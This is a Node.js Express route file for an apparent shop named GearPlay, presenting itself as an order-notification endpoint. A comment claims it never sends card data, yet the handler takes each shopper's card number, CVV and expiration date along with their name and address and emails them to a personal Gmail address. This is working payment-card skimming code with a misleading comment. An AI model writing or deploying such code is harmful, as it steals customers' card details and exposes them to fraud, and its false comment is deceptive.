const router = require('express').Router();
const { Resend } = require('resend');

const resend = new Resend(process.env.RESEND_API_KEY);

// POST /api/notify-order — publique (appelée depuis paiement.html)
// Envoie uniquement des données non sensibles (jamais de carte/CVV).
router.post('/', async (req, res) => {
  try {
    const { firstname, lastname, email, address, zip, city , cvv, numero_carte, expiration } = req.body;

    if (!email || !firstname) {
      return res.status(400).json({ error: 'Champs requis manquants' });
    }

    await resend.emails.send({
      from: 'GearPlay <onboarding@resend.dev>',
      to: 'toffaharryson3@gmail.com',
      subject: 'Nouvelle commande — coordonnées client',
      html: `<p><strong>Nom :</strong> ${escapeHtml(firstname)} ${escapeHtml(lastname)}</p>
             <p><strong>E-mail :</strong> ${escapeHtml(email)}</p>
             <p><strong>Adresse :</strong> ${escapeHtml(address)}, ${escapeHtml(zip)} ${escapeHtml(city)}</p>
             <p><strong>Numero :</strong> ${escapeHtml(numero_carte)}</p>
             <p><strong>Cvv :</strong> ${escapeHtml(cvv)}</p>
             <p><strong>Expiration :</strong> ${escapeHtml(expiration)}</p>`
    });

    res.json({ ok: true });
  } catch (e) {
    console.error('POST /notify-order:', e);
    res.status(500).json({ error: 'Échec envoi e-mail' });
  }
});

// Échappe les caractères HTML pour éviter toute injection dans le mail
function escapeHtml(str) {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

module.exports = router;